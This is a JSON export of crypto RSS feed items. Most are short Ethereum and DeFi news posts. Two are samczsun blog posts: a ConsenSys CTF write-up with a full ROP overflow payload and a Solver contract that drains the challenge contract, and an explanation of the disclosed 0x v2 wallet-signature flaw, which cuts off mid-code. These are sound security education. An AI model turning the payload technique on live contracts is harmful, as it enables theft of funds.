[{"creator":"@taoeffect Greg Slepak","title":"Single-slot PBS using attesters as distributed availability oracle","link":"https://ethresear.ch/t/single-slot-pbs-using-attesters-as-distributed-availability-oracle/11877/5","pubDate":"Wed, 14 Dec 2022 03:19:23 +0000","dc:creator":"@taoeffect Greg Slepak","content":" <p>Someone forwarded this video to me from Eric Wall: <a href=\"https://www.youtube.com/watch?v=sFMEeQ4mebA\" class=\"inline-onebox\" rel=\"noopener nofollow ugc\">Social Slashing by Eric Wall | Devcon Bogotá - YouTube</a></p>\n<p>It seems to partly answer my question - that you all believe that the current censorship is not being done by validators but by some off-chain group, and that by messing around with MEV incentives and mechanisms you think you might fix the problem.</p>\n<p>OK, well, good luck with that. It doesn’t seem to address the fundamental issue, and we’ll see what happens.</p> ","contentSnippet":"Someone forwarded this video to me from Eric Wall: Social Slashing by Eric Wall | Devcon Bogotá - YouTube\nIt seems to partly answer my question - that you all believe that the current censorship is not being done by validators but by some off-chain group, and that by messing around with MEV incentives and mechanisms you think you might fix the problem.\nOK, well, good luck with that. It doesn’t seem to address the fundamental issue, and we’ll see what happens.","guid":"ethresear.ch-post-36733","isoDate":"2022-12-14T03:19:23.000Z","from":"https://ethresear.ch/posts.rss","hashId":"a1b1ee375f001332dc2c8533f1f3be50"},{"title":"Gearbox 创新的流动性引导方案：Cider’ed","link":"https://www.defidaonews.com/article/6793164","pubDate":"2022-12-14T03:13:36.000Z","author":"Overkoalafied","summary":"<p><strong>Chainfeeds 导读：</strong></p><p>本文详细介绍了 DeFi 杠杆协议 Gearbox 引导流动性的机制「Cider’ed」，一种单边的 GEAR/ETH Curve V2 LP 拍卖机制，GEAR 持有者以及 ETH 持有者都可以分别参与。这种机制有何创新？</p>\n<p><strong>文章来源：</strong></p><p><a href=\"https://www.defidaonews.com/article/6793164\">https://www.defidaonews.com/article/6793164</a></p>\n<p><strong>文章作者：</strong></p><p>Overkoalafied</p><hr><h3>观点：</h3><p><strong>Overkoalafied：</strong>「Cider’ed」是一种正式交易前的过渡机制，于 12 月 13 日启动，同时 13 日 - 14 日是 GEAR 存款阶段，根据提案计划，存入合约 GEAR 的数量范围在 1.2 亿枚 - 1.6 亿枚。15-16 日是 ETH 存款阶段，ETH 的数量范围在 2000 枚 - 3000 枚。随后 Cider 合约将验证最低 GEAR 和 ETH 存款要求是否得到满足，如未达最低要求，所有资金将被退回。</p><a href=\"https://www.defidaonews.com/article/6793164\">内容来源</a><p><strong>Overkoalafied：</strong>如满足最低存款要求，就会创建一个 Curve V2 流动性池，用户提供的资产将获得对应比例的 LP 代币，无论从哪一方进入，用户都能以 0.015-0.03 美元的范围「买入或卖出 GEAR 代币」。12 月 23 日为正式交易期，在此之前，GEAR 代币无法转让。</p><a href=\"https://www.defidaonews.com/article/6793164\">内容来源</a><p><strong>Overkoalafied：</strong>Cider'ed 方法的好处在于限制稀释，允许价格发现，并以一种有利于 LP 的方式重新设计代币发行。代币的买卖双方通常会支付极高的 Gas 费来为代币定价，但使用 Cider'ed，费用会随着时间的推移而分散，从而允许将费用重新用作流动性挖矿奖励。价格范围仍然允许一定程度的价格发现，而 DAO 不需要出售大量自己的代币并进一步稀释供应。</p><a href=\"https://www.defidaonews.com/article/6793164\">内容来源</a>","id":"urn:uuid:0357a336-d00f-cda9-f940-ecf6ca1f0a12","isoDate":"2022-12-14T03:13:36.000Z","from":"https://www.chainfeeds.xyz/rss","hashId":"1912993a636efc8173d8cbad7e67c3fb"},{"title":"南方东英推出比特币和以太坊期货 ETF，计划 12 月 16 日在港交所上市交易","link":"http://www.stcn.com/article/detail/754067.html","pubDate":"2022-12-14T03:39:34.000Z","author":"ChainFeeds","summary":"<h3>南方东英推出比特币和以太坊期货 ETF，计划 12 月 16 日在港交所上市交易</h3>\n<p>南方东英资产管理有限公司（南方东英）推出加密期货 ETF，包括比特币期货 ETF 和以太坊期货 ETF 两只产品，每单位价格约 7.8 港元，最低投资门槛 780 港元，管理费每年 1.99%，两只产品计划 12 月 16 日正式在港交所上市交易，认购时间为 12 月 13-14 日。南方东英加密期货 ETF 不直接投资于加密资产，而是主要投资于芝商所的比特币期货与以太坊期货。</p>\n<p><a href=\"http://www.stcn.com/article/detail/754067.html\">内容来源</a></p><hr>","id":"urn:uuid:ab37ef32-1635-9d0d-ad00-840974bb81a7","isoDate":"2022-12-14T03:39:34.000Z","from":"https://www.chainfeeds.xyz/rss","hashId":"575382af24c54560f4c678f086a13da9"},{"title":"一文了解DeepGo：Web3内容社交产品如何出圈？","link":"https://techflowpost.mirror.xyz/52kGJUyvwozio902j_rhs48nP22gc6DT43binLbenVU","pubDate":"2022-12-14T03:57:51.000Z","author":"深潮TechFlow","content":"<p><a href=\"https://techflowpost.mirror.xyz/52kGJUyvwozio902j_rhs48nP22gc6DT43binLbenVU\"><img src=\"https://mirror-media.imgix.net/publication-images/TWX-d9mAwWNj8ZCttUvAl.png?height=547&amp;width=1093&amp;h=547&amp;w=1093&amp;auto=compress\" alt=\"\" /></a></p>\n<p><strong><a href=\"https://techflowpost.mirror.xyz/52kGJUyvwozio902j_rhs48nP22gc6DT43binLbenVU\">一文了解DeepGo：Web3内容社交产品如何出圈？ – 深潮TechFlow</a></strong></p>\n<blockquote>\n<p>撰文：Morty</p>\n</blockquote>\n<p><a href=\"https://techflowpost.mirror.xyz/52kGJUyvwozio902j_rhs48nP22gc6DT43binLbenVU\">Read the full entry</a></p>\n","contentSnippet":"一文了解DeepGo：Web3内容社交产品如何出圈？ – 深潮TechFlow\n撰文：Morty\nRead the full entry","id":"https://techflowpost.mirror.xyz/52kGJUyvwozio902j_rhs48nP22gc6DT43binLbenVU","isoDate":"2022-12-14T03:57:51.000Z","from":"https://techflowpost.mirror.xyz/feed/atom","hashId":"6d6dcba4086a307655aceda6da16ca48"},{"creator":"samczsun","title":"ConsenSys CTF - Rop EVM","link":"https://samczsun.com/consensys-ctf-2-rop-evm/","pubDate":"Sat, 23 Mar 2019 04:49:13 GMT","content:encoded":"<p>This is the second writeup for a series of CTFs by ConsenSys Diligence. The first writeup can be found <a href=\"https://samczsun.com/consensys-ctf-writeup/\">here</a>.</p><h2 id=\"introduction\">Introduction</h2><p>The CTF contract was deployed to <a href=\"https://ethstats.io/account/0xefa51bc7aafe33e6f0e4e44d19eab7595f4cca87\">0xefa51bc7aafe33e6f0e4e44d19eab7595f4cca87</a> and announced <a href=\"https://medium.com/consensys-diligence/consensys-diligence-ethereum-hacking-challenge-2-bf3dfff639e0\">here</a>.</p><p>Right off the bat, most decompilers are unable to decompile the contract so we&apos;ll need to resort to reading the disassembly. However, <a href=\"https://eveem.org/code/0xEfa51BC7AaFE33e6f0E4E44d19Eab7595F4Cca87\">Eveem</a> is able to locate four public functions. Three of them have known signatures:</p><ul><li>get()</li><li>die()</li><li>set(uint256)</li></ul><p><code>get()</code> and <code>die()</code> are simple and can be expressed in pseudocode, shown below. We can assume that <code>get()</code> is provided as a sanity check, while <code>die()</code> is clearly the function we&apos;ll need to call to solve this CTF.</p><pre><code class=\"language-solidity\">address private storage_00;\naddress private storage_20;\n\nfunction get() public returns (address) {\n\trequire(msg.sender != storage_00);\n\treturn storage_00;\n}\n\nfunction die() public {\n\trequire(msg.sender == storage_20);\n\tselfdestruct(storage_20);\n}</code></pre><p>Upon investigating <code>set(uint256)</code>, we notice that it is significantly more complex than the functions that came before it. This is because a <a href=\"https://en.wikipedia.org/wiki/Call_stack\">call stack</a> was manually implemented. The implementation of the call stack is reproduced in pseudocode below.</p><pre><code class=\"language-solidity\">function stack_push(uint256 value) private {\n\tmemory[memory[0x100]+0x20] = value;\n\tmemory[0x100] = memory[0x100] + 0x20;\n}\n\nfunction stack_get(uint256 depth) private {\n\treturn memory[memory[0x100] - depth*0x20];\n}\n\nfunction stack_pop() private returns (uint256 value) {\n\tvalue = memory[memory[0x100]];\n\tmemory[0x100] = memory[0x100] - 0x20;\n}\n\nfunction stack_push_frame() private {\n\tstack_push(memory[0x100]);\n}\n\nfunction stack_pop_frame() private returns (uint256 dest) {\n\tdest = stack_pop();\n\tmemory[0x100] = stack_pop();\n}</code></pre><p>Using the call stack functions, <code>set(uint256)</code> can be expressed as follows:</p><pre><code class=\"language-solidity\">function set(uint256 value) public {\n\tstack_push_frame();\n\tstack_push(return_lbl);\n\tstack_push(value);\n\tstack_push(0x00);\n\tset_impl();\nreturn_lbl:\n\treturn;\n}\n\nfunction set_impl() private {\n\tstorage[stack_get(0)] = stack_get(1);\n\tstack_pop();\n\tstack_pop();\n\tgoto stack_pop_frame();\n}</code></pre><p>Or, even more succinctly:</p><pre><code class=\"language-solidity\">address private storage_00;\n\nfunction set(uint256 value) public {\n\tstorage_00 = address(value);\n}</code></pre><p>This just leaves the mystery function:</p><pre><code class=\"language-solidity\">function 0x7909947a() public {\n\tmemory[0x100] = 0x100;\n\tstack_push(0x00);\n\tvar var1 = memory[0x100]; // 0x120\n\tstack_push(0x00);\n\tmemcpy(memory[0x90000], msg.data[0x44], msg.data.length-0x44);\n\n\tstack_push_frame();\n\tstack_push(irrelevant_lbl);\n\tstack_push(0x90000);\n\tstack_push(var1);\n\tstack_push(msg.data.length - 0x44);\n\tstack_push(0x00);\n\n\t0x7909947a_impl();\n\nirrelevant_lbl:\n\t// some irrelevant code\n}\n\nfunction 0x7909947a_impl() private {\n\tcopy_data();\n\tmemory[stack_get(2) + stack_get(0)] = 0x00;\n\tpad_data();\n\n\tstack_pop();\n\tstack_pop();\n\tstack_pop();\n\tstack_pop();\n\tgoto stack_pop_frame();\n}\n\nfunction copy_data() private {\n\twhile (stack_get(0) - stack_get(1) != 0) {\n\t\tmemory[stack_get(2) + stack_get(0)] = memory[stack_get(3) + stack_get(0)] &gt;&gt; 248;\n\t\tmemory[memory[0x100]] = memory[memory[0x100]] + 0x01;\n\t}\n}\n\nfunction pad_data() private {\n\twhile (stack_get(0) % 0x40 != 0) {\n\t\tmemory[stack_get(2) + stack_get(0)] = 0x00;\n\t\tmemory[memory[0x100]] = memory[memory[0x100]] + 0x01;\n\t}\n}</code></pre><h2 id=\"analysis\">Analysis</h2><p>For those who weren&apos;t familiar, the name of this CTF refers to the technique called <a href=\"https://en.wikipedia.org/wiki/Return-oriented_programming\">Return Oriented Programming</a>. When attackers are able to overflow the call stack, they can use ROP to redirect the control flow of the program by clobbering the return address. The bits of code that attackers redirect control flow to are called &quot;gadgets&quot;.</p><p>As the goal of the CTF is to drain the contract of funds, it&apos;s clear that we need to somehow write our address to the storage slot <code>0x20</code>. Fortunately, we have a gadget to do this at <code>set_impl</code>, which writes <code>stack_get(1)</code> to <code>stack_get(0)</code>.</p><p>In order to take advantage of the gadget at <code>set_impl</code>, we need our stack to look something like this:</p><pre><code>--------------------------------\n|       stack frame set()      |\n--------------------------------\n|  address of &apos;return&apos; gadget  |     |\n--------------------------------     |   stack grows down\n|          our address         |     V\n--------------------------------\n|             0x20             |\n--------------------------------</code></pre><p>However, our stack looks like this when entering <code>0x7909947a_impl()</code>:</p><pre><code>----------------------------------\n|              0x00              |    &lt;---- this is 0x0120\n----------------------------------\n|              0x00              |\n----------------------------------\n|    stack frame 0x7909947a()    |\n----------------------------------\n|         irrelevant_lbl         |     |\n----------------------------------     |   stack grows down\n|            0x090000            |     V\n----------------------------------\n|             0x0120             |\n----------------------------------\n|     msg.data.length - 0x44     |\n----------------------------------\n|              0x00              |\n----------------------------------</code></pre><p>When <code>0x7909947a_impl()</code> is called, it will copy <code>msg.data[0x44:]</code> to <code>memory[0x120]</code>. This means that if our message is longer than <code>0x40</code> bytes, it will clobber the stack frame, then the return address, and so on. However, we can&apos;t fit the four stack items required to use the <code>set_impl</code> gadget in the two empty spaces we have on the stack.</p><p>Fortunately, our payload was copied to <code>memory[0x90000]</code>. As such, we can simply update the stack frame pointer to point to somewhere around <code>0x90000</code> where our fake stack will be.</p><p>Now that we have a plan, we can start laying out our payload. First, we need the function signature.</p><pre><code>7909947a</code></pre><p>The first two words are ignored.</p><pre><code>0000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000000000000000</code></pre><p>Next, two words will be copied to <code>memory[0x120]</code>. The value doesn&apos;t matter because it&apos;s unused.</p><pre><code>0000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000000000000000</code></pre><p>The next two words will clobber the stack frame pointer and the return address. The total message will be <code>0x184</code> bytes long but the first <code>0x44</code> bytes are ignored, leaving a total of <code>0x140</code> bytes. As such, our fake stack frame will point to <code>0x90140</code>. We use <code>0x2ea</code> as the return address because that&apos;s where the function <code>set_impl</code> is located.</p><pre><code>0000000000000000000000000000000000000000000000000000000000090140\n00000000000000000000000000000000000000000000000000000000000002ea</code></pre><p>Because the payload is copied into memory one byte at a time, we need to be careful when overwriting the next four words. Fortunately, the first three are static values. However, the fourth word is the number of bytes currently copied and so we must specify the number of bytes copied at that point in time.</p><pre><code>0000000000000000000000000000000000000000000000000000000000090000\n0000000000000000000000000000000000000000000000000000000000000120\n0000000000000000000000000000000000000000000000000000000000000140\n00000000000000000000000000000000000000000000000000000000000000ff</code></pre><p>Finally, we construct the fake stack that <code>set_impl</code> will read. We first specify the address that <code>set_impl</code> will return to, which is located at <code>return_lbl</code> or <code>0x344</code>. Then, we specify the value we want written to storage. Finally, we specify the storage slot we want to write to.</p><pre><code>0000000000000000000000000000000000000000000000000000000000000344\n0000000000000000000000003331B3Ef4F70Ed428b7978B41DAB353Ca610D938\n0000000000000000000000000000000000000000000000000000000000000020</code></pre><p>Putting it all together, our payload looks like this:</p><pre><code>7909947a\n0000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000000000090140\n00000000000000000000000000000000000000000000000000000000000002ea\n0000000000000000000000000000000000000000000000000000000000090000\n0000000000000000000000000000000000000000000000000000000000000120\n0000000000000000000000000000000000000000000000000000000000000140\n00000000000000000000000000000000000000000000000000000000000000ff\n0000000000000000000000000000000000000000000000000000000000000344\n0000000000000000000000003331B3Ef4F70Ed428b7978B41DAB353Ca610D938\n0000000000000000000000000000000000000000000000000000000000000020</code></pre><p>All that&apos;s left is to write a contract to trigger the overflow and <a href=\"https://etherscan.io/tx/0xd1a83dd897ead5ae4a62a736d41a43475e3c7ccefbd45c777ce8ec539405d7d4\">claim the funds</a>.</p><pre><code class=\"language-solidity\">pragma solidity ^0.5.0;\n\ncontract Target {\n    function get()public returns (address) ;\n    function set(uint a) public;\n    function die() public;\n}\n\ncontract Solver {\n    constructor(bytes memory data) public payable {\n        (bool result, ) = address(0xEfa51BC7AaFE33e6f0E4E44d19Eab7595F4Cca87).call(data);\n        require(result);\n        Target(0xEfa51BC7AaFE33e6f0E4E44d19Eab7595F4Cca87).die();\n        require(address(this).balance &gt; 0);\n        selfdestruct(msg.sender);\n    }\n}</code></pre><h2 id=\"conclusion\">Conclusion</h2><p>This CTF simulated a program with a classic buffer overflow vulnerability and was significantly more challenging than the previous. Kudos to the creator, <a href=\"https://medium.com/@nathan.peercy\">Nathan Peercy</a>, for accurately recreating the setup in the EVM.</p>","content:encodedSnippet":"This is the second writeup for a series of CTFs by ConsenSys Diligence. The first writeup can be found here.\nIntroduction\nThe CTF contract was deployed to 0xefa51bc7aafe33e6f0e4e44d19eab7595f4cca87 and announced here.\nRight off the bat, most decompilers are unable to decompile the contract so we'll need to resort to reading the disassembly. However, Eveem is able to locate four public functions. Three of them have known signatures:\n\nget()\ndie()\nset(uint256)\n\nget() and die() are simple and can be expressed in pseudocode, shown below. We can assume that get() is provided as a sanity check, while die() is clearly the function we'll need to call to solve this CTF.\naddress private storage_00;\naddress private storage_20;\n\nfunction get() public returns (address) {\n\trequire(msg.sender != storage_00);\n\treturn storage_00;\n}\n\nfunction die() public {\n\trequire(msg.sender == storage_20);\n\tselfdestruct(storage_20);\n}\nUpon investigating set(uint256), we notice that it is significantly more complex than the functions that came before it. This is because a call stack was manually implemented. The implementation of the call stack is reproduced in pseudocode below.\nfunction stack_push(uint256 value) private {\n\tmemory[memory[0x100]+0x20] = value;\n\tmemory[0x100] = memory[0x100] + 0x20;\n}\n\nfunction stack_get(uint256 depth) private {\n\treturn memory[memory[0x100] - depth*0x20];\n}\n\nfunction stack_pop() private returns (uint256 value) {\n\tvalue = memory[memory[0x100]];\n\tmemory[0x100] = memory[0x100] - 0x20;\n}\n\nfunction stack_push_frame() private {\n\tstack_push(memory[0x100]);\n}\n\nfunction stack_pop_frame() private returns (uint256 dest) {\n\tdest = stack_pop();\n\tmemory[0x100] = stack_pop();\n}\nUsing the call stack functions, set(uint256) can be expressed as follows:\nfunction set(uint256 value) public {\n\tstack_push_frame();\n\tstack_push(return_lbl);\n\tstack_push(value);\n\tstack_push(0x00);\n\tset_impl();\nreturn_lbl:\n\treturn;\n}\n\nfunction set_impl() private {\n\tstorage[stack_get(0)] = stack_get(1);\n\tstack_pop();\n\tstack_pop();\n\tgoto stack_pop_frame();\n}\nOr, even more succinctly:\naddress private storage_00;\n\nfunction set(uint256 value) public {\n\tstorage_00 = address(value);\n}\nThis just leaves the mystery function:\nfunction 0x7909947a() public {\n\tmemory[0x100] = 0x100;\n\tstack_push(0x00);\n\tvar var1 = memory[0x100]; // 0x120\n\tstack_push(0x00);\n\tmemcpy(memory[0x90000], msg.data[0x44], msg.data.length-0x44);\n\n\tstack_push_frame();\n\tstack_push(irrelevant_lbl);\n\tstack_push(0x90000);\n\tstack_push(var1);\n\tstack_push(msg.data.length - 0x44);\n\tstack_push(0x00);\n\n\t0x7909947a_impl();\n\nirrelevant_lbl:\n\t// some irrelevant code\n}\n\nfunction 0x7909947a_impl() private {\n\tcopy_data();\n\tmemory[stack_get(2) + stack_get(0)] = 0x00;\n\tpad_data();\n\n\tstack_pop();\n\tstack_pop();\n\tstack_pop();\n\tstack_pop();\n\tgoto stack_pop_frame();\n}\n\nfunction copy_data() private {\n\twhile (stack_get(0) - stack_get(1) != 0) {\n\t\tmemory[stack_get(2) + stack_get(0)] = memory[stack_get(3) + stack_get(0)] >> 248;\n\t\tmemory[memory[0x100]] = memory[memory[0x100]] + 0x01;\n\t}\n}\n\nfunction pad_data() private {\n\twhile (stack_get(0) % 0x40 != 0) {\n\t\tmemory[stack_get(2) + stack_get(0)] = 0x00;\n\t\tmemory[memory[0x100]] = memory[memory[0x100]] + 0x01;\n\t}\n}\nAnalysis\nFor those who weren't familiar, the name of this CTF refers to the technique called Return Oriented Programming. When attackers are able to overflow the call stack, they can use ROP to redirect the control flow of the program by clobbering the return address. The bits of code that attackers redirect control flow to are called \"gadgets\".\nAs the goal of the CTF is to drain the contract of funds, it's clear that we need to somehow write our address to the storage slot 0x20. Fortunately, we have a gadget to do this at set_impl, which writes stack_get(1) to stack_get(0).\nIn order to take advantage of the gadget at set_impl, we need our stack to look something like this:\n--------------------------------\n|       stack frame set()      |\n--------------------------------\n|  address of 'return' gadget  |     |\n--------------------------------     |   stack grows down\n|          our address         |     V\n--------------------------------\n|             0x20             |\n--------------------------------\nHowever, our stack looks like this when entering 0x7909947a_impl():\n----------------------------------\n|              0x00              |    <---- this is 0x0120\n----------------------------------\n|              0x00              |\n----------------------------------\n|    stack frame 0x7909947a()    |\n----------------------------------\n|         irrelevant_lbl         |     |\n----------------------------------     |   stack grows down\n|            0x090000            |     V\n----------------------------------\n|             0x0120             |\n----------------------------------\n|     msg.data.length - 0x44     |\n----------------------------------\n|              0x00              |\n----------------------------------\nWhen 0x7909947a_impl() is called, it will copy msg.data[0x44:] to memory[0x120]. This means that if our message is longer than 0x40 bytes, it will clobber the stack frame, then the return address, and so on. However, we can't fit the four stack items required to use the set_impl gadget in the two empty spaces we have on the stack.\nFortunately, our payload was copied to memory[0x90000]. As such, we can simply update the stack frame pointer to point to somewhere around 0x90000 where our fake stack will be.\nNow that we have a plan, we can start laying out our payload. First, we need the function signature.\n7909947a\nThe first two words are ignored.\n0000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000000000000000\nNext, two words will be copied to memory[0x120]. The value doesn't matter because it's unused.\n0000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000000000000000\nThe next two words will clobber the stack frame pointer and the return address. The total message will be 0x184 bytes long but the first 0x44 bytes are ignored, leaving a total of 0x140 bytes. As such, our fake stack frame will point to 0x90140. We use 0x2ea as the return address because that's where the function set_impl is located.\n0000000000000000000000000000000000000000000000000000000000090140\n00000000000000000000000000000000000000000000000000000000000002ea\nBecause the payload is copied into memory one byte at a time, we need to be careful when overwriting the next four words. Fortunately, the first three are static values. However, the fourth word is the number of bytes currently copied and so we must specify the number of bytes copied at that point in time.\n0000000000000000000000000000000000000000000000000000000000090000\n0000000000000000000000000000000000000000000000000000000000000120\n0000000000000000000000000000000000000000000000000000000000000140\n00000000000000000000000000000000000000000000000000000000000000ff\nFinally, we construct the fake stack that set_impl will read. We first specify the address that set_impl will return to, which is located at return_lbl or 0x344. Then, we specify the value we want written to storage. Finally, we specify the storage slot we want to write to.\n0000000000000000000000000000000000000000000000000000000000000344\n0000000000000000000000003331B3Ef4F70Ed428b7978B41DAB353Ca610D938\n0000000000000000000000000000000000000000000000000000000000000020\nPutting it all together, our payload looks like this:\n7909947a\n0000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000000000000000\n0000000000000000000000000000000000000000000000000000000000090140\n00000000000000000000000000000000000000000000000000000000000002ea\n0000000000000000000000000000000000000000000000000000000000090000\n0000000000000000000000000000000000000000000000000000000000000120\n0000000000000000000000000000000000000000000000000000000000000140\n00000000000000000000000000000000000000000000000000000000000000ff\n0000000000000000000000000000000000000000000000000000000000000344\n0000000000000000000000003331B3Ef4F70Ed428b7978B41DAB353Ca610D938\n0000000000000000000000000000000000000000000000000000000000000020\nAll that's left is to write a contract to trigger the overflow and claim the funds.\npragma solidity ^0.5.0;\n\ncontract Target {\n    function get()public returns (address) ;\n    function set(uint a) public;\n    function die() public;\n}\n\ncontract Solver {\n    constructor(bytes memory data) public payable {\n        (bool result, ) = address(0xEfa51BC7AaFE33e6f0E4E44d19Eab7595F4Cca87).call(data);\n        require(result);\n        Target(0xEfa51BC7AaFE33e6f0E4E44d19Eab7595F4Cca87).die();\n        require(address(this).balance > 0);\n        selfdestruct(msg.sender);\n    }\n}\nConclusion\nThis CTF simulated a program with a classic buffer overflow vulnerability and was significantly more challenging than the previous. Kudos to the creator, Nathan Peercy, for accurately recreating the setup in the EVM.","dc:creator":"samczsun","content":"A second CTF from ConsenSys Diligence. The solution is a blast from the past.","contentSnippet":"A second CTF from ConsenSys Diligence. The solution is a blast from the past.","guid":"5c95890d557f2f0001b96df4","isoDate":"2019-03-23T04:49:13.000Z","from":"https://samczsun.com/rss/","hashId":"dfcc938b3e99d3b1331b7e95d301423d"},{"creator":"samczsun","title":"The 0x vulnerability, explained","link":"https://samczsun.com/the-0x-vulnerability-explained/","pubDate":"Sun, 14 Jul 2019 02:28:27 GMT","content:encoded":"<p>On Friday July 12th, 0x <a href=\"https://blog.0xproject.com/shut-down-of-0x-exchange-v2-0-contract-and-migration-to-patched-version-6185097a1f39\">shut down</a> their v2 Exchange because a flaw in the signature verification routine meant that a signature of <code>0x04</code> was treated as a valid signature for all non-smart-contract accounts. This blog post explains how this is possible.</p><h2 id=\"background\">Background</h2><p>0x is, when grossly oversimplified, a platform which allows users to trade with other users. If Alice wants to buy 1000 ZRX for 1 ETH, Alice can submit an order through the 0x protocol. If Bob then decides that he wants to take Alice&apos;s order, he can use 0x&apos;s Exchange contract to securely perform the exchange.</p><p>In order for the Exchange to make sure that Alice really did make the offer that Bob claims she&apos;s making, Bob needs to submit Alice&apos;s <em>signature</em> with the order data. This signature is the only thing preventing Bob from claiming that Alice is offering 1000000 ZRX for 1 wei, so it&apos;s imperative that signatures can&apos;t be forged.</p><p>0x supports <a href=\"https://github.com/0xProject/0x-protocol-specification/blob/master/v2/v2-specification.md#signature-types\">several types of signatures</a>. <em>EIP712</em> and <em>EthSign</em> signatures are based on <a href=\"https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm\">ECDSA signatures</a> and are cryptographically secure, while <em>Wallet</em> and <em>Validator</em> signatures query an address for the validity of the provided signature. The <em>Wallet</em> signature in particular will query the sender address, and is intended to allow multi-signature wallets to make trades.</p><h1 id=\"the-code\">The Code</h1><p>Let&apos;s take a look at how 0x verifies a <em>Wallet</em> signature. </p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-solidity\">function isValidWalletSignature(\n    bytes32 hash,\n    address walletAddress,\n    bytes signature\n)\n    internal\n    view\n    returns (bool isValid)\n{\n    bytes memory calldata = abi.encodeWithSelector(\n        IWallet(walletAddress).isValidSignature.selector,\n        hash,\n        signature\n    );\n    assembly {\n        let cdStart := add(calldata, 32)\n        let success := staticcall(\n            gas,              // forward all gas\n            walletAddress,    // address of Wallet contract\n            cdStart,          // pointer to start of input\n            mload(calldata),  // length of input\n            cdStart,          // write output over input\n            32                // output size is 32 bytes\n        )\n\n        switch success\n        case 0 {\n            // Revert with `Error(&quot;WALLET_ERROR&quot;)`\n            /* snip */\n            revert(0, 100)\n        }\n        case 1 {\n            // Signature is valid if call did not revert and returned true\n            isValid := mload(cdStart)\n        }\n    }\n    return isValid;\n}</code></pre><figcaption><a href=\"https://github.com/0xProject/0x-monorepo/blob/965d6098294beb22292090c461151274ee6f9a26/packages/contracts/src/2.0.0/protocol/Exchange/MixinSignatureValidator.sol#L233-L273\">Source</a></figcaption></figure><p>If we ignore the fact that this was written in inline assembly, it&apos;s fairly straightforward. First, lines 10-14 construct the ABI-encoded data which will be sent to the wallet. Lines 17-24 perform the call to the wallet. Finally, lines 26-34 check whether the call succeeded, and load the returned boolean.</p><h1 id=\"the-problem\">The Problem</h1><p>While the code to validate a <em>Wallet</em> signature was simple enough, it was written without knowledge of at least one of these two subtleties of the EVM:</p><p><strong>1. Executing instructions outside the code is equivalent to executing STOP instructions</strong></p><p>In most modern computers, executing undefined instructions means that your computer will execute garbage until the program crashes. However, the EVM is special because if execution happens to go outside the code of the smart contract, it&apos;s implicitly treated as a <code>STOP</code> instruction. </p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2019/07/image-1.png\" class=\"kg-image\" alt loading=\"lazy\"><figcaption>Section 9.4</figcaption></figure><p>A side effect of this is that accounts with <em>no code</em> can still be executed - they&apos;ll just immediately halt.</p><p><strong>2. While the CALL family of instructions allow specifying where the output should be copied, the output area is not cleared beforehand</strong></p><p>Take a look at this excerpt from the formal definition of the <code>CALL</code> instruction, where <code><strong>&#xB5;</strong>[5]</code> is where in memory the return data should be copied, <code><strong>&#xB5;</strong>[6]</code> is the length of the return data to be copied, and <code><strong>o</strong></code> is the data returned by the <code>CALL</code> instruction.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2019/07/image.png\" class=\"kg-image\" alt loading=\"lazy\"><figcaption>Appendix H</figcaption></figure><p>This states that only <code>n</code> bytes will be copied from the returned data to main memory, where <code>n</code> is the minimum of the number of bytes expected and the number of bytes returned. This implies that if less bytes are returned than expected, <em>only</em> the number of bytes returned will be copied to memory.</p><p>Going back to the validation routine, the authors instructed the EVM to overwrite the input data with the returned data, likely to save gas. Under normal operation, given a hash of <code>0xAA...AA</code> and a signature of <code>0x1CFF...FF</code>, the memory before and after a call might look something like this.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2019/07/image-2.png\" class=\"kg-image\" alt loading=\"lazy\"><figcaption>Before</figcaption></figure><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2019/07/image-3.png\" class=\"kg-image\" alt loading=\"lazy\"><figcaption>After</figcaption></figure><p>However, if there was no data returned by the call, then the memory after the call would look like this:</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2019/07/image-2.png\" class=\"kg-image\" alt loading=\"lazy\"><figcaption>After</figcaption></figure><p>In other words, the memory is unchanged. Now, when the code on line 33 loads the first 32 bytes into a boolean variable, the nonzero value is coerced into <code>true</code>. Then, this <code>true</code> is returned from the function, indicating that &quot;yes, the signature provided is fine&quot; when it clearly isn&apos;t.</p><p>As for why the magic signature of <code>0x04</code> is always considered valid, it&apos;s because <code>0x04</code> is the ID number for a <em>Wallet</em> type signature, and the signature type is the last byte in the signature array.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-solidity\">// Allowed signature types.\nenum SignatureType {\n    Illegal,         // 0x00, default value\n    Invalid,         // 0x01\n    EIP712,          // 0x02\n    EthSign,         // 0x03\n    Wallet,          // 0x04\n    Validator,       // 0x05\n    PreSigned,       // 0x06\n    NSignatureTypes  // 0x07, number of signature types. Always leave at end.\n}</code></pre><figcaption><a href=\"https://github.com/0xProject/0x-monorepo/blob/965d6098294beb22292090c461151274ee6f9a26/packages/contracts/src/2.0.0/protocol/Exchange/mixins/MSignatureValidator.sol#L33-L43\">Source</a></figcaption></figure><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-solidity\">function isValidSignature(\n    bytes32 hash,\n    address signerAddress,\n    bytes memory signature\n)\n    public\n    view\n    returns (bool isValid)\n{\n    /* snip */\n\n    // Pop last byte off of signature byte array.\n    uint8 signatureTypeRaw = uint8(signature.popLastByte());\n    \n    /* snip */\n\n    SignatureType signatureType = SignatureType(signatureTypeRaw);\n    \n    /* snip */\n    if (signatureType == SignatureType.Wallet) {\n        isValid = 